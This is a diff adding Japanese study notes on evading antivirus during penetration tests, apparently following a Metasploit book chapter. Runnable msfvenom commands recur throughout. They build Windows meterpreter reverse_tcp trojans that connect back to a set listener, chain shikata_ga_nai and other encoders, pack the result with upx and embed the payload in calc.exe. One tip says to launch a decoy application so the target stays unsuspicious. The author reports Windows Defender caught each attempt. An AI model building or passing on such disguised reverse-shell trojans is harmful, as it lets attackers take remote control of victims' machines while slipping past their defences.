@@ -1,0 +1,53 @@
+第7章 検出の回避
+ペネトレーションテストを行う際、アンチウィルスソフトにつかまるのは恥ずかしい。
+なので計画に回避方法を入れておくこと。
+アンチウィルスソフト検出は基本シグネチャで識別する。
+シグネチャはアンチウィルスソフトにロードされディスクストレージをスキャンしマッチさせる。
+アンチウィルスを回避するには一般に出回っているシグネチャと一致しない独自のペイロードを作成すればよい。
+もしくはメモリ上で動作させるだけで保存させなければ良い。
+
+MSPayloadでスタンドアロンバイナリを作成する
+MSPayloadはないのでmsfvenom
+既に6章で作成したので割愛
+作成したものをWindows Defenderで検出されるか確認してみる。
+ちゃんと検出された。
+実際に仕掛ける前に調べることが重要。
+
+MSFencodeでエンコードする。
+MSFencodeもないのでmsfvenom
+エンコードすることでアンチウイルスソフトには別物に見えるが、
+動作は同じというものが作成できる。
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.61.7.100 LPORT= 444 -e x86/shikata_ga_nai -i 20 -f exe > /root/Desktop/trojan2.exe
+これでも検出される。
+
+マルチエンコーディング
+静的バイナリ自体を変換せずに検出を実行するとアンチウイルスシグネチャが頻繁に更新され
+新規の、変更されたペイロードを検出するいたちごっことなる。
+シグネチャをチェックするアンチウイルスプログラムに対しペイロードを何度もエンコードして
+混乱されるマルチエンコーディングを行うことでよりよい結果が得られる可能性もある。
+
+msfvenom -p windows/meterpreter/reversetcp LHOST=10.61.7.100 LPORT=444 -f raw -e shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/alphaupper -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 9 -f exe -o /root/trojan3.exe;upx -9 -v -o /root/trojan3.exe /root/trojan3.exe
+これでも検出された。
+恐らくmetasploitで作成されたものはどうなっていても全て検出するような気がする。
+
+カスタムの実行ファイルテンプレート
+一般的にmsfvenomでエンコードするときはdata/templates/template.exeにあるデフォルトの
+実行ファイルテンプレートに埋め込まれる。
+これを利用せずに-xオプションを利用することでWindows実行ファイルを使用することが出来る。
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.61.7.100 LPORT=444 -x calc.exe -f exe > /root/Desktop/trojan4.exe
+
+https://www.hackingloops.com/how-to-use-msfvenom-in-penetration-testing-msfvenom-tutorial/
+
+ペイロードをステルスに立ち上げる
+ターゲットユーザに対してバックドアを実行させた場合、何も起きないことへの
+不信感もあるので立ち上げたアプリケーションを平行して立ち上げるようにすること。
+
+パッカー
+パッカーは実行ファイルを圧縮しそのファイルと展開のためのコードを組み合わせるツールである。
+この実行ファイルを実行すると展開コードがその実行前に圧縮コードから元の実行ファイルを再生する。
+upxを入れて圧縮。
+それでもWindows Defenderでは検出された。
+
+アンチウイルスソフトの進化は凄いので日々、調べていくことが大切。
+とりあえずWindowsDefenderを回避するには自作するしかなさそう。
